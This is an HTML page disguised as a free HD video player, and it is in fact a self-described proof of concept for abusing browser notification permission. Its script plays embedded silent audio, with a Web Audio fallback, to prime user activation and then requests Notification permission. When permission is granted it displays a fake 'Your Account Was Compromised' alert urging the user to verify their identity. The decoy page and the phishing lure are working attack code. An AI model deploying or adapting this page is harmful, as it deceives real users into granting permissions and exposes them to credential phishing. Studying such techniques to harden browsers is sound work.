<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Free HD Video Streaming</title>
<style>
  body { font-family: Arial, sans-serif; background: #111; color: #eee;
         text-align: center; padding: 40px 20px; }
  .player { max-width: 640px; margin: 0 auto; background: #1c1c1c;
            padding: 20px; border-radius: 10px; }
  video { width: 100%; border-radius: 6px; background: #000; }
  button { padding: 10px 18px; margin: 10px 6px; border: none;
           border-radius: 4px; background: #e50914; color: #fff;
           cursor: pointer; font-size: 14px; }
  button.secondary { background: #444; }
  pre { text-align: left; background: #222; color: #9fd49f; padding: 10px;
        font-size: 12px; max-width: 640px; margin: 16px auto;
        white-space: pre-wrap; }
</style>
</head>
<body>
<div class="player">
  <h2>HD Player — Now Playing</h2>
  <!-- Silent audio embedded as base64 WAV (1s, no external file).
       Playing it within the user gesture primes the origin as
       user-engaged so the Notification prompt is allowed. -->
  <audio id="silent" preload="auto"
    src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA="></audio>

  <button class="secondary" onclick="askNotif()">Enable Notifications</button>
  <pre id="log">Status: idle</pre>
</div>

<script>
const log = document.getElementById('log');
const ts = () => new Date().toISOString().slice(11, 23);

function setLog(msg) {
  log.textContent = `[${ts()}] ${msg}`;
}

// Silent 1s WAV fallback generator via Web Audio API
// (works even if the data URI is blocked by CSP)
function playSilent() {
  const au = document.getElementById('silent');
  const viaAudio = au.play().then(() => 'embedded silent WAV');
  const viaWebAudio = new Promise((resolve) => {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const buf = ctx.createBuffer(1, ctx.sampleRate, ctx.sampleRate);
    const src = ctx.createBufferSource();
    src.buffer = buf;               // zero-filled = silence
    src.connect(ctx.destination);
    src.start(0);
    src.onended = () => { ctx.close(); resolve('WebAudio silent buffer'); };
  });
  return viaAudio.catch(() => viaWebAudio);
}

function askNotif() {
  setLog('Playing silent audio to prime user activation...');
  playSilent().then(how => {
    setLog(`Silent audio started (${how}). Origin is now treated as ` +
           'user-engaged; requesting Notification permission.');
    return Notification.requestPermission();
  }).then(p => {
    setLog('Permission = ' + p);
    if (p === 'granted') {
      new Notification('Security Alert: Your Account Was Compromised', {
        body: 'Click to verify your identity now.',
        icon: '/icon.png'
      });
      setLog('Permission granted — simulated social-engineering ' +
             'notification displayed. PoC complete.');
    }
  }).catch(e => setLog('Error: ' + e.name + ' — ' + e.message));
}
</script>
</body>
</html>
